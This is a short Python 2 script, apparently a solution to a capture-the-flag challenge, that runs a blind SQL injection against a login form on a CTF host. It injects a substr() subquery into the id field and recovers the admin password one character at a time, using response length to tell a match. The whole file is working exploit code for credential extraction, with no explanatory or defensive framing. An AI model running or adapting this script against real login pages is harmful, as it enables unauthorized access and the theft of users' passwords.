#!/usr/bin/env python
# coding: UTF-8

import sys
import urllib
import urllib2

def httpRequest(id, pw):

	url = 'http://ctfq.sweetduet.info:10080/~q6/'
	req = {'id': id, 'pass': pw}
	params = urllib.urlencode(req)
	response = urllib2.urlopen(url, params)
	data = response.read()
	# print data
	# print len(data)

	return data

def atkpw(plen):

	flag = ''

	for p in range(0, plen):
		for i in range(48, 123):
			char = chr(i)
			id = "admin' AND substr((SELECT pass FROM user WHERE id='admin'), " + str(p + 1) + ", 1) = " + "'" + char + "'" + " ; --"
			pw = "''"

			data = httpRequest(id, pw)

			if len(data) > 2000:
				print(str(i) + ": " + char)
				flag = flag + char
				print(flag)
				break

	return flag

if __name__ == '__main__':
	plen = 21
	print(atkpw(plen))
